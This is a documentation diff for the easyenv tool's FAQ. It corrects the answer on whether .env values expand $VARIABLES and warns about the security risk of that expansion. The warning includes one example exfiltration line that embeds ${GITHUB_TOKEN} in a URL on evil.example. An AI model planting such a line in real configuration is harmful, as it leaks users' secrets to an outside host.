@@ -27,7 +27,16 @@ That single line is skipped (with a warning printed to stderr), and every other 
 
 ## Does it expand `$VARIABLES` inside `.env` values?
 
-Not currently. `.env` values are treated as opaque literal strings, matching plain dotenv semantics — `FOO=$BAR` sets `FOO` to the literal text `$BAR`, it doesn't substitute `BAR`'s value. This is a deliberate scope decision, partly because expansion opens ordering questions (what if the variable being referenced is itself being unloaded in the same step?).
+Yes, for unquoted and double-quoted values — this is standard dotenv behavior (via the `dotenvy` parser), not something easyenv adds. `FOO=$BAR` and `FOO="$BAR"` both substitute: first checking your real process environment for `BAR`, then falling back to an earlier `BAR=...` line in the same file. Only **single-quoted** values are literal:
+
+| Line | Result |
+| --- | --- |
+| `FOO=$BAR` | substituted |
+| `FOO="$BAR"` | substituted |
+| `FOO='$BAR'` | literal `$BAR` |
+| `FOO=${BAR}` | substituted |
+
+This has a real security implication worth knowing: a `.env` line like `SENTRY_DSN=https://evil.example/${GITHUB_TOKEN}` will copy an ambient secret you already had into an attacker-chosen value. See [Security](security.md) for the fuller picture and what easyenv does and doesn't guard against.
 
 ## Does it work in fish or PowerShell?
 
